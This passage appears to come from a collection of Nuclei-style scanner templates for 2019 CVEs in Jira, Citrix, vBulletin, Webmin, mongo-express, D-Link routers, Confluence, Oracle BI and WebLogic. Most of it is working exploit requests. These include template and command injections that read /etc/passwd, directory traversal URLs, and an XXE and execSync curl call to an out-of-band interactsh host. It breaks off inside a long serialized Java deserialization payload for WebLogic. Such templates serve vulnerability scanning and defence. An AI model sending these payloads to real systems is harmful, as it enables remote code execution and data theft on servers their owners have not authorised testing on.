};defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \ndefineClass.setAccessible(true);\nx=defineClass.invoke(\n    y,\n   'Exploit.Test234',\n    z.getBytes('latin1'),    0,\n    3054\n);x.getMethod('test', ''.class).invoke(null, 'cat /etc/passwd');'done!'}\n"}, {"property": "type", "value": "jexl"}], "limit": 50, "page": 1}], "method": "previewAssets"}

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# Atlassian Jira Server-Side Template Injection

## Description

- Jira Server and Data Center is susceptible to a server-side template injection vulnerability via the ContactAdministrators and SendBulkMail actions. An attacker is able to remotely execute code on systems that run a vulnerable version of Jira Server or Data Center. All versions of Jira Server and Data Center from 4.4.0 before 7.6.14, from 7.7.0 before 7.13.5, from 8.0.0 before 8.0.3, from 8.1.0 before 8.1.2, and from 8.2.0 before 8.2.3 are affected by this vulnerability.
- severity - critical
- tags - cve,cve2019,atlassian,jira,ssti,rce,kev,cisa

## Requests

- Method - GET

### URL

- {{BaseURL}}/secure/ContactAdministrators!default.jspa

### Matchers

**Type - regex**

- regex
  1. \(v4\.4\.
  2. \(v5\.
  3. \(v6\.
  4. \(v7\.[012345789]\.
  5. \(v7\.1[0-2]\.
  6. \(v7\.6\.([0-9]|[1][0-3])
  7. \(v7\.\13\.[0-4]
  8. \(v8\.0\.[0-2]
  9. \(v8\.1\.[0-1]
  10. \(v8\.2\.[0-2]
- condition - or
- part - body

**Type - word**

- words
  1. Contact Site Administrators
- part - body

**Type - word**

- words
  1. has not yet configured this contact form
- part - body
- negative - True

---

# Citrix ADC and Gateway - Directory Traversal

## Description

- Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0 are susceptible to directory traversal vulnerabilities.
- severity - critical
- tags - cve,cve2019,citrix,lfi,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/vpn/../vpns/cfg/smb.conf

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. [global]

---

# vBulletin v5.0.0-v5.5.4 - Remote Command Execution

## Description

- vBulletin 5.x through 5.5.4 allows remote command execution via the widgetConfig[code] parameter in an ajax/render/widget_php routestring request.
- severity - critical
- tags - cve,cve2019,rce,kev,seclists,vbulletin

## Requests

### Step - 1

```
POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20md5%28%22CVE-2019-16759%22%29%3B

```

### Matchers

**Type - word**

- words
  1. addcc9f9f2f40e2e6aca3079b73d9d17

**Type - status**

- status
  1. 200

---

# Webmin \<= 1.920 - Unauthenticated Remote Command Execution

## Description

- Webmin \<=1.920. is vulnerable to an unauthenticated remote command execution via the parameter 'old' in password_change.cgi.
- severity - critical
- tags - cve,cve2019,webmin,rce,kev,edb

## Requests

### Step - 1

```
POST /password_change.cgi HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

user=rootxx&pam=&old=test|cat /etc/passwd&new1=test2&new2=test2&expired=2

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# mongo-express Remote Code Execution

## Description

- mongo-express before 0.54.0 is vulnerable to remote code execution via endpoints that uses the `toBSON` method and misuse the `vm` dependency to perform `exec` commands in a non-safe environment.
- severity - critical
- tags - vulhub,cve,cve2019,mongo,mongo-express,kev

## Requests

### Step - 1

```
POST /checkValid HTTP/1.1
Host: {{Hostname}}
Authorization: Basic YWRtaW46cGFzcw==
Content-Type: application/x-www-form-urlencoded

document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl {{interactsh-url}}")

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Barco/AWIND OEM Presentation Platform - Remote Command Injection

## Description

- The Crestron AM-100 firmware 1.6.0.2, Crestron AM-101 firmware 2.7.0.1, Barco wePresent WiPG-1000P firmware 2.3.0.10, Barco wePresent WiPG-1600W before firmware 2.4.1.19, Extron ShareLink 200/250 firmware 2.0.3.4, Teq AV IT WIPS710 firmware 1.1.0.7, SHARP PN-L703WA firmware 1.4.2.3, Optoma WPS-Pro firmware 1.0.0.5, Blackbox HD WPS firmware 1.0.0.5, InFocus LiteShow3 firmware 1.0.16, and InFocus LiteShow4 2.0.0.7 are vulnerable to command injection via the file_transfer.cgi HTTP endpoint. A remote, unauthenticated attacker can use this vulnerability to execute operating system commands as root.
- severity - critical
- tags - tenable,cve,cve2019,oast,injection,kev,edb,rce,packetstorm

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/cgi-bin/file_transfer.cgi
  - file_transfer=new&dir=%27Pa_Noteexpr%20curl%2b{{interactsh-url}}Pa_Note%27

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# D-Link Routers - Remote Code Execution

## Description

- D-Link products such as DIR-655C, DIR-866L, DIR-652, and DHP-1565 contain an unauthenticated remote code execution vulnerability. The issue occurs when the attacker sends an arbitrary input to a "PingTest" device common gateway interface that could lead to common injection. An attacker who successfully triggers the command injection could achieve full system compromise. Later, it was independently found that these issues also affected; DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.
- severity - critical
- tags - cve,cve2019,dlink,rce,router,unauth,kev

## Requests

### Step - 1

```
POST /apply_sec.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}

html_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=62384

```

### Step - 2

```
POST /apply_sec.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/login_pic.asp
Cookie: uid=1234123

html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('cat /etc/passwd')}}

```

### Step - 3

```
POST /apply_sec.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/login_pic.asp
Cookie: uid=1234123

html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('type C:\\Windows\\win.ini')}}

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:
  2. \[(font|extension|file)s\]
- condition - or

**Type - status**

- status
  1. 200

---

# TVT NVMS 1000 - Local File Inclusion

## Description

- TVT NVMS-1000 devices allow GET /.. local file inclusion attacks.

- severity - high
- tags - cve,cve2019,iot,lfi,kev,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini

### Matchers

**Type - regex**

- part - body
- regex
  1. \[(font|extension|file)s\]

**Type - status**

- status
  1. 200

---

# Kibana Timelion - Arbitrary Code Execution

## Description

- Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw in the Timelion visualizer. An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.
- severity - critical
- tags - cve,cve2019,kibana,rce,kev

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/api/timelion/run
  - {"sheet":[".es(*)"],"time":{"from":"now-1m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}

### Matchers

**Type - word**

- words
  1. seriesList
- part - body

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# Atlassian Confluence Server - Path Traversal

## Description

- The Widget Connector macro in Atlassian Confluence Server before version 6.6.12 (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x), and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x), allows remote attackers to achieve path traversal and remote code execution on a Confluence Server or Data Center instance via server-side template injection.
- severity - critical
- tags - cve,cve2019,atlassian,confluence,lfi,rce,kev,packetstorm

## Requests

### Step - 1

```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: {{Hostname}}
Referer: {{Hostname}}

{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<param-name>contextConfigLocation\</param-name>

---

# Oracle Business Intelligence/XML Publisher - XML External Entity Injection

## Description

- Oracle Business Intelligence and XML Publisher 11.1.1.9.0 / 12.2.1.3.0 / 12.2.1.4.0 are vulnerable to an XML external entity injection attack.
- severity - high
- tags - cve,cve2019,oracle,xxe,oast,kev,edb

## Requests

### Step - 1

```
POST /xmlpserver/ReportTemplateService.xls HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: text/xml; charset=UTF-8

<!DOCTYPE soap:envelope PUBLIC "-//B/A/EN" "http://{{interactsh-url}}">

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Oracle WebLogic Server - Remote Command Execution

## Description

- The Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: Web Services) allows unauthenticated attackers with network access via HTTP to compromise Oracle WebLogic Server. Versions that are affected are 10.3.6.0.0 and 12.1.3.0.0.

- severity - critical
- tags - kev,edb,cve,cve2019,oracle,weblogic,rce

## Requests

### Step - 1

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: text/xml
cmd: id

<?xml version="1.0" encoding="utf-8" ?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action/><wsa:RelatesTo/><asy:onAsyncDelivery/><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void><array class="byte" length="5010"><void index="0"><byte>-84</byte></void><void index="1"><byte>-19</byte></void><void index="2"><byte>0</byte></void><void index="3"><byte>5</byte></void><void index="4"><byte>115</byte></void><void index="5"><byte>114</byte></void><void index="6"><byte>0</byte></void><void index="7"><byte>23</byte></void><void index="8"><byte>106</byte></void><void index="9"><byte>97</byte></void><void index="10"><byte>118</byte></void><void index="11"><byte>97</byte></void><void index="12"><byte>46</byte></void><void index="13"><byte>117</byte></void><void index="14"><byte>116</byte></void><void index="15"><byte>105</byte></void><void index="16"><byte>108</byte></void><void index="17"><byte>46</byte></void><void index="18"><byte>76</byte></void><void index="19"><byte>105</byte></void><void index="20"><byte>110</byte></void><void index="21"><byte>107</byte></void><void index="22"><byte>101</byte></void><void index="23"><byte>100</byte></void><void index="24"><byte>72</byte></void><void index="25"><byte>97</byte></void><void index="26"><byte>115</byte></void><void index="27"><byte>104</byte></void><void index="28"><byte>83</byte></void><void index="29"><byte>101</byte></void><void index="30"><byte>116</byte></void><void index="31"><byte>-40</byte></void><void index="32"><byte>108</byte></void><void index="33"><byte>-41</byte></void><void index="34"><byte>90</byte></void><void index="35"><byte>-107</byte></void><void index="36"><byte>-35</byte></void><void index="37"><byte>42</byte></void><void index="38"><byte>30</byte></void><void index="39"><byte>2</byte></void><void index="40"><byte>0</byte></void><void index="41"><byte>0</byte></void><void index="42"><byte>120</byte></void><void index="43"><byte>114</byte></void><void index="44"><byte>0</byte></void><void index="45"><byte>17</byte></void><void index="46"><byte>106</byte></void><void index="47"><byte>97</byte></void><void index="48"><byte>118</byte></void><void index="49"><byte>97</byte></void><void index="50"><byte>46</byte></void><void index="51"><byte>117</byte></void><void index="52"><byte>116</byte></void><void index="53"><byte>105</byte></void><void index="54"><byte>108</byte></void><void index="55"><byte>46</byte></void><void index="56"><byte>72</byte></void><void index="57"><byte>97</byte></void><void index="58"><byte>115</byte></void><void index="59"><byte>104</byte></void><void index="60"><byte>83</byte></void><void index="61"><byte>101</byte></void><void index="62"><byte>116</byte></void><void index="63"><byte>-70</byte></void><void index="64"><byte>68</byte></void><void index="65"><byte>-123</byte></void><void index="66"><byte>-107</byte></void><void index="67"><byte>-106</byte></void><void index="68"><byte>-72</byte></void><void index="69"><byte>-73</byte></void><void index="70"><byte>52</byte></void><void index="71"><byte>3</byte></void><void index="72"><byte>0</byte></void><void index="73"><byte>0</byte></void><void index="74"><byte>120</byte></void><void index="75"><byte>112</byte></void><void index="76"><byte>119</byte></void><void index="77"><byte>12</byte></void><void index="78"><byte>0</byte></void><void index="79"><byte>0</byte></void><void index="80"><byte>0</byte></void><void index="81"><byte>16</byte></void><void index="82"><byte>63</byte></void><void index="83"><byte>64</byte></void><void index="84"><byte>0</byte></void><void index="85"><byte>0</byte></void><void index="86"><byte>0</byte></void><void index="87"><byte>0</byte></void><void index="88"><byte>0</byte></void><void index="89"><byte>2</byte></void><void index="90"><byte>115</byte></void><void index="91"><byte>114</byte></void><void index="92"><byte>0</byte></void><void index="93"><byte>58</byte></void><void index="94"><byte>99</byte></void><void index="95"><byte>111</byte></void><void index="96"><byte>109</byte></void><void index="97"><byte>46</byte></void><void index="98"><byte>115</byte></void><void index="99"><byte>117</byte></void><void index="100"><byte>110</byte></void><void index="101"><byte>46</byte></void><void index="102"><byte>111</byte></void><void index="103"><byte>114</byte></void><void index="104"><byte>103</byte></void><void index="105"><byte>46</byte></void><void index="106"><byte>97</byte></void><void index="107"><byte>112</byte></void><void index="108"><byte>97</byte></void><void index="109"><byte>99</byte></void><void index="110"><byte>104</byte></void><void index="111"><byte>101</byte></void><void index="112"><byte>46</byte></void><void index="113"><byte>120</byte></void><void index="114"><byte>97</byte></void><void index="115"><byte>108</byte></void><void index="116"><byte>97</byte></void><void index="117"><byte>110</byte></void><void index="118"><byte>46</byte></void><void index="119"><byte>105</byte></void><void index="120"><byte>110</byte></void><void index="121"><byte>116</byte></void><void index="122"><byte>101</byte></void><void index="123"><byte>114</byte></void><void index="124"><byte>110</byte></void><void index="125"><byte>97</byte></void><void index="126"><byte>108</byte></void><void index="127"><byte>46</byte></void><void index="128"><byte>120</byte></void><void index="129"><byte>115</byte></void><void index="130"><byte>108</byte></void><void index="131"><byte>116</byte></void><void index="132"><byte>99</byte></void><void index="133"><byte>46</byte></void><void index="134"><byte>116</byte></void><void index="135"><byte>114</byte></void><void index="136"><byte>97</byte></void><void index="137"><byte>120</byte></void><void index="138"><byte>46</byte></void><void index="139"><byte>84</byte></void><void index="140"><byte>101</byte></void><void index="141"><byte>109</byte></void><void index="142"><byte>112</byte></void><void index="143"><byte>108</byte></void><void index="144"><byte>97</byte></void><void index="145"><byte>116</byte></void><void index="146"><byte>101</byte></void><void index="147"><byte>115</byte></void><void index="148"><byte>73</byte></void><void index="149"><byte>109</byte></void><void index="150"><byte>112</byte></void><void index="151"><byte>108</byte></void><void index="152"><byte>9</byte></void><void index="153"><byte>87</byte></void><void index="154"><byte>79</byte></void><void index="155"><byte>-63</byte></void><void index="156"><byte>110</byte></void><void index="157"><byte>-84</byte></void><void index="158"><byte>-85</byte></void><void index="159"><byte>51</byte></void><void index="160"><byte>3</byte></void><void index="161"><byte>0</byte></void><void index="162"><byte>9</byte></void><void index="163"><byte>73</byte></void><void index="164"><byte>0</byte></void><void index="165"><byte>13</byte></void><void index="166"><byte>95</byte></void><void index="167"><byte>105</byte></void><void index="168"><byte>110</byte></void><void index="169"><byte>100</byte></void><void index="170"><byte>101</byte></void><void index="171"><byte>110</byte></void><void index="172"><byte>116</byte></void><void index="173"><byte>78</byte></void><void index="174"><byte>117</byte></void><void index="175"><byte>109</byte></void><void index="176"><byte>98</byte></void><void index="177"><byte>101</byte></void><void index="178"><byte>114</byte></void><void index="179"><byte>73</byte></void><void index="180"><byte>0</byte></void><void index="181"><byte>14</byte></void><void index="182"><byte>95</byte></void><void index="183"><byte>116</byte></void><void index="184"><byte>114</byte></void><void index="185"><byte>97</byte></void><void index="186"><byte>110</byte></void><void index="187"><byte>115</byte></void><void index="188"><byte>108</byte></void><void index="189"><byte>101</byte></void><void index="190"><byte>116</byte></void><void index="191"><byte>73</byte></void><void index="192"><byte>110</byte></void><void index="193"><byte>100</byte></void><void index="194"><byte>101</byte></void><void index="195"><byte>120</byte></void><void index="196"><byte>90</byte></void><void index="197"><byte>0</byte></void><void index="198"><byte>21</byte></void><void index="199"><byte>95</byte></void><void index="200"><byte>117</byte></void><void index="201"><byte>115</byte></void><void index="202"><byte>101</byte></void><void index="203"><byte>83</byte></void><void index="204"><byte>101</byte></void><void index="205"><byte>114</byte></void><void index="206"><byte>118</byte></void><void index="207"><byte>105</byte></void><void index="208"><byte>99</byte></void><void index="209"><byte>101</byte></void><void index="210"><byte>115</byte></void><void index="211"><byte>77</byte></void><void index="212"><byte>101</byte></void><void index="213"><byte>99</byte></void><void index="214"><byte>104</byte></void><void index="215"><byte>97</byte></void><void index="216"><byte>110</byte></void><void index="217"><byte>105</byte></void><void index="218"><byte>115</byte></void><void index="219"><byte>109</byte></void><void index="220"><byte>76</byte></void><void index="221"><byte>0</byte></void><void index="222"><byte>25</byte></void><void index="223"><byte>95</byte></void><void index="224"><byte>97</byte></void><void index="225"><byte>99</byte></void><void index="226"><byte>99</byte></void><void index="227"><byte>101</byte></void><void index="228"><byte>115</byte></void><void index="229"><byte>115</byte></void><void index="230"><byte>69</byte></void><void index="231"><byte>120</byte></void><void index="232"><byte>116</byte></void><void index="233"><byte>101</byte></void><void index="234"><byte>114</byte></void><void index="235"><byte>110</byte></void><void index="236"><byte>97</byte></void><void index="237"><byte>108</byte></void><void index="238"><byte>83</byte></void><void index="239"><byte>116</byte></void><void index="240"><byte>121</byte></void><void index="241"><byte>108</byte></void><void index="242"><byte>101</byte></void><void index="243"><byte>115</byte></void><void index="244"><byte>104</byte></void><void index="245"><byte>101</byte></void><void index="246"><byte>101</byte></void><void index="247"><byte>116</byte></void><void index="248"><byte>116</byte></void><void index="249"><byte>0</byte></void><void index="250"><byte>18</byte></void><void index="251"><byte>76</byte></void><void index="252"><byte>106</byte></void><void index="253"><byte>97</byte></void><void index="254"><byte>118</byte></void><void index="255"><byte>97</byte></void><void index="256"><byte>47</byte></void><void index="257"><byte>108</byte></void><void index="258"><byte>97</byte></void><void index="259"><byte>110</byte></void><void index="260"><byte>103</byte></void><void index="261"><byte>47</byte></void><void index="262"><byte>83</byte></void><void index="263"><byte>116</byte></void><void index="264"><byte>114</byte></void><void index="265"><byte>105</byte></void><void index="266"><byte>110</byte></void><void index="267"><byte>103</byte></void><void index="268"><byte>59</byte></void><void index="269"><byte>76</byte></void><void index="270"><byte>0</byte></void><void index="271"><byte>11</byte></void><void index="272"><byte>95</byte></void><void index="273"><byte>97</byte></void><void index="274"><byte>117</byte></void><void index="275"><byte>120</byte></void><void index="276"><byte>67</byte></void><void index="277"><byte>108</byte></void><void index="278"><byte>97</byte></void><void index="279"><byte>115</byte></void><void index="280"><byte>115</byte></void><void index="281"><byte>101</byte></void><void index="282"><byte>115</byte></void><void index="283"><byte>116</byte></void><void index="284"><byte>0</byte></void><void index="285"><byte>59</byte></void><void index="286"><byte>76</byte></void><void index="287"><byte>99</byte></void><void index="288"><byte>111</byte></void><void index="289"><byte>109</byte></void><void index="290"><byte>47</byte></void><void index="291"><byte>115</byte></void><void index="292"><byte>117</byte></void><void index="293"><byte>110</byte></void><void index="294"><byte>47</byte></void><void index="295"><byte>111</byte></void><void index="296"><byte>114</byte></void><void index="297"><byte>103</byte></void><void index="298"><byte>47</byte></void><void index="299"><byte>97</byte></void><void index="300"><byte>112</byte></void><void index="301"><byte>97</byte></void><void index="302"><byte>99</byte></void><void index="303"><byte>104</byte></void><void index="304"><byte>101</byte></void><void index="305"><byte>47</byte></void><void index="306"><byte>120</byte></void><void index="307"><byte>97</byte></void><void index="308"><byte>108</byte></void><void index="309"><byte>97</byte></void><void index="310"><byte>110</byte></void><void index="311"><byte>47</byte></void><void index="312"><byte>105</byte></void><void index="313"><byte>110</byte></void><void index="314"><byte>116</byte></void><void index="315"><byte>101</byte></void><void index="316"><byte>114</byte></void><void index="317"><byte>110</byte></void><void index="318"><byte>97</byte></void><void index="319"><byte>108</byte></void><void index="320"><byte>47</byte></void><void index="321"><byte>120</byte></void><void index="322"><byte>115</byte></void><void index="323"><byte>108</byte></void><void index="324"><byte>116</byte></void><void index="325"><byte>99</byte></void><void index="326"><byte>47</byte></void><void index="327"><byte>114</byte></void><void index="328"><byte>117</byte></void><void index="329"><byte>110</byte></void><void index="330"><byte>116</byte></void><void index="331"><byte>105</byte></void><void index="332"><byte>109</byte></void><void index="333"><byte>101</byte></void><void index="334"><byte>47</byte></void><void index="335"><byte>72</byte></void><void index="336"><byte>97</byte></void><void index="337"><byte>115</byte></void><void index="338"><byte>104</byte></void><void index="339"><byte>116</byte></void><void index="340"><byte>97</byte></void><void index="341"><byte>98</byte></void><void index="342"><byte>108</byte></void><void index="343"><byte>101</byte></void><void index="344"><byte>59</byte></void><void index="345"><byte>91</byte></void><void index="346"><byte>0</byte></void><void index="347"><byte>10</byte></void><void index="348"><byte>95</byte></void><void index="349"><byte>98</byte></void><void index="350"><byte>121</byte></void><void index="351"><byte>116</byte></void><void index="352"><byte>101</byte></void><void index="353"><byte>99</byte></void><void index="354"><byte>111</byte></void><void index="355"><byte>100</byte></void><void index="356"><byte>101</byte></void><void index="357"><byte>115</byte></void><void index="358"><byte>116</byte></void><void index="359"><byte>0</byte></void><void index="360"><byte>3</byte></void><void index="361"><byte>91</byte></void><void index="362"><byte>91</byte></void><void index="363"><byte>66</byte></void><void index="364"><byte>91</byte></void><void index="365"><byte>0</byte></void><void index="366"><byte>6</byte></void><void index="367"><byte>95</byte></void><void index="368"><byte>99</byte></void><void index="369"><byte>108</byte></void><void index="370"><byte>97</byte></void><void index="371"><byte>115</byte></void><void index="372"><byte>115</byte></void><void index="373"><byte>116</byte></void><void index="374"><byte>0</byte></void><void index="375"><byte>18</byte></void><void index="376"><byte>91</byte></void><void index="377"><byte>76</byte></void><void index="378"><byte>106</byte></void><void index="379"><byte>97</byte></void><void index="380"><byte>118</byte></void><void index="381"><byte>97</byte></void><void index="382"><byte>47</byte></void><void index="383"><byte>108</byte></void><void index="384"><byte>97</byte></void><void index="385"><byte>110</byte></void><void index="386"><byte>103</byte></void><void index="387"><byte>47</byte></void><void index="388"><byte>67</byte></void><void index="389"><byte>108</byte></void><void index="390"><byte>97</byte></void><void index="391"><byte>115</byte></void><void index="392"><byte>115</byte></void><void index="393"><byte>59</byte></void><void index="394"><byte>76</byte></void><void index="395"><byte>0</byte></void><void index="396"><byte>5</byte></void><void index="397"><byte>95</byte></void><void index="398"><byte>110</byte></void><void index="399"><byte>97</byte></void><void index="400"><byte>109</byte></void><void index="401"><byte>101</byte></void><void index="402"><byte>113</byte></void><void index="403"><byte>0</byte></void><void index="404"><byte>126</byte></void><void index="405"><byte>0</byte></void><void index="406"><byte>4</byte></void><void index="407"><byte>76</byte></void><void index="408"><byte>0</byte></void><void index="409"><byte>17</byte></void><void index="410"><byte>95</byte></void><void index="411"><byte>111</byte></void><void index="412"><byte>117</byte></void><void index="413"><byte>116</byte></void><void index="414"><byte>112</byte></void><void index="415"><byte>117</byte></void><void index="416"><byte>116</byte></void><void index="417"><byte>80</byte></void><void index="418"><byte>114</byte></void><void index="419"><byte>111</byte></void><void index="420"><byte>112</byte></void><void index="421"><byte>101</byte></void><void index="422"><byte>114</byte></void><void index="423"><byte>116</byte></void><void index="424"><byte>105</byte></void><void index="425"><byte>101</byte></void><void index="426"><byte>115</byte></void><void index="427"><byte>116</byte></void><void index="428"><byte>0</byte></void><void index="429"><byte>22</byte></void><void index="430"><byte>76</byte></void><void index="431"><byte>106</byte></void><void index="432"><byte>97</byte></void><void index="433"><byte>118</byte></void><void index="434"><byte>97</byte></void><void index="435"><byte>47</byte></void><void index="436"><byte>117</byte></void><void index="437"><byte>116</byte></void><void index="438"><byte>105</byte></void><void index="439"><byte>108</byte></void><void index="440"><byte>47</byte></void><void index="441"><byte>80</byte></void><void index="442"><byte>114</byte></void><void index="443"><byte>111</byte></void><void index="444"><byte>112</byte></void><void index="445"><byte>101</byte></void><void index="446"><byte>114</byte></void><void index="447"><byte>116</byte></void><void index="448"><byte>105</byte></void><void index="449"><byte>101</byte></void><void index="450"><byte>115</byte></void><void index="451"><byte>59</byte></void><void index="452"><byte>120</byte></void><void index="453"><byte>112</byte></void><void index="454"><byte>0</byte></void><void index="455"><byte>0</byte></void><void index="456"><byte>0</byte></void><void index="457"><byte>0</byte></void><void index="458"><byte>-1</byte></void><void index="459"><byte>-1</byte></void><void index="460"><byte>-1</byte></void><void index="461"><byte>-1</byte></void><void index="462"><byte>0</byte></void><void index="463"><byte>116</byte></void><void index="464"><byte>0</byte></void><void index="465"><byte>3</byte></void><void index="466"><byte>97</byte></void><void index="467"><byte>108</byte></void><void index="468"><byte>108</byte></void><void index="469"><byte>112</byte></void><void index="470"><byte>117</byte></void><void index="471"><byte>114</byte></void><void index="472"><byte>0</byte></void><void index="473"><byte>3</byte></void><void index="474"><byte>91</byte></void><void index="475"><byte>91</byte></void><void index="476"><byte>66</byte></void><void index="477"><byte>75</byte></void><void index="478"><byte>-3</byte></void><void index="479"><byte>25</byte></void><void index="480"><byte>21</byte></void><void index="481"><byte>103</byte></void><void index="482"><byte>103</byte></void><void index="483"><byte>-37</byte></void><void index="484"><byte>55</byte></void><void index="485"><byte>2</byte></void><void index="486"><byte>0</byte></void><void index="487"><byte>0</byte></void><void index="488"><byte>120</byte></void><void index="489"><byte>112</byte></void><void index="490"><byte>0</byte></void><void index="491"><byte>0</byte></void><void index="492"><byte>0</byte></void><void index="493"><byte>2</byte></void><void index="494"><byte>117</byte></void><void index="495"><byte>114</byte></void><void index="496"><byte>0</byte></void><void index="497"><byte>2</byte></void><void index="498"><byte>91</byte></void><void index="499"><byte>66</byte></void><void index="500"><byte>-84</byte></void><void index="501"><byte>-13</byte></void><void index="502"><byte>23</byte></void><void index="503"><byte>-8</byte></void><void index="504"><byte>6</byte></void><void index="505"><byte>8</byte></void><void index="506"><byte>84</byte></void><void index="507"><byte>-32</byte></void><void index="508"><byte>2</byte></void><void index="509"><byte>0</byte></void><void index="510"><byte>0</byte></void><void index="511"><byte>120</byte></void><void index="512"><byte>112</byte></void><void index="513"><byte>0</byte></void><void index="514"><byte>0</byte></void><void index="515"><byte>14</byte></void><void index="516"><byte>29</byte></void><void index="517"><byte>-54</byte></void><void index="518"><byte>-2</byte></void><void index="519"><byte>-70</byte></void><void index="520"><byte>-66</byte></void><void index="521"><byte>0</byte></void><void index="522"><byte>0</byte></void><void index="523"><byte>0</byte></void><void index="524"><byte>50</byte></void><void index="525"><byte>0</byte></void><void index="526"><byte>-70</byte></void><void index="527"><byte>10</byte></void><void index="528"><byte>0</byte></void><void index="529"><byte>3</byte></void><void index="530"><byte>0</byte></void><void index="531"><byte>34</byte></void><void index="532"><byte>7</byte></void><void index="533"><byte>0</byte></void><void index="534"><byte>-72</byte></void><void index="535"><byte>7</byte></void><void index="536"><byte>0</byte></void><void index="537"><byte>37</byte></void><void index="538"><byte>7</byte></void><void index="539"><byte>0</byte></void><void index="540"><byte>38</byte></void><void index="541"><byte>1</byte></void><void index="542"><byte>0</byte></void><void index="543"><byte>16</byte></void><void index="544"><byte>115</byte></void><void index="545"><byte>101</byte></void><void index="546"><byte>114</byte></void><void index="547"><byte>105</byte></void><void index="548"><byte>97</byte></void><void index="549"><byte>108</byte></void><void index="550"><byte>86</byte></void><void index="551"><byte>101</byte></void><void index="552"><byte>114</byte></void><void index="553"><byte>115</byte></void><void index="554"><byte>105</byte></void><void index="555"><byte>111</byte></void><void index="556"><byte>110</byte></void><void index="557"><byte>85</byte></void><void index="558"><byte>73</byte></void><void index="559"><byte>68</byte></void><void index="560"><byte>1</byte></void><void index="561"><byte>0</byte></void><void index="562"><byte>1</byte></void><void index="563"><byte>74</byte></void><void index="564"><byte>1</byte></void><void index="565"><byte>0</byte></void><void index="566"><byte>13</byte></void><void index="567"><byte>67</byte></void><void index="568"><byte>111</byte></void><void index="569"><byte>110</byte></void><void index="570"><byte>115</byte></void><void index="571"><byte>116</byte></void><void index="572"><byte>97</byte></void><void index="573"><byte>110</byte></void><void index="574"><byte>116</byte></void><void index="575"><byte>86</byte></void><void index="576"><byte>97</byte></void><void index="577"><byte>108</byte></void><void index="578"><byte>117</byte></void><void index="579"><byte>101</byte></void><void index="580"><byte>5</byte></void><void index="581"><byte>-83</byte></void><void index="582"><byte>32</byte></void><void index="583"><byte>-109</byte></void><void index="584"><byte>-13</byte></void><void index="585"><byte>-111</byte></void><void index="586"><byte>-35</byte></void><void index="587"><byte>-17</byte></void><void index="588"><byte>62</byte></void><void index="589"><byte>1</byte></void><void index="590"><byte>0</byte></void><void index="591"><byte>6</byte></void><void index="592"><byte>60</byte></void><void index="593"><byte>105</byte></void><void index="594"><byte>110</byte></void><void index="595"><byte>105</byte></void><void index="596"><byte>116</byte></void><void index="597"><byte>62</byte></void><void index="598"><byte>1</byte></void><void index="599"><byte>0</byte></void><void 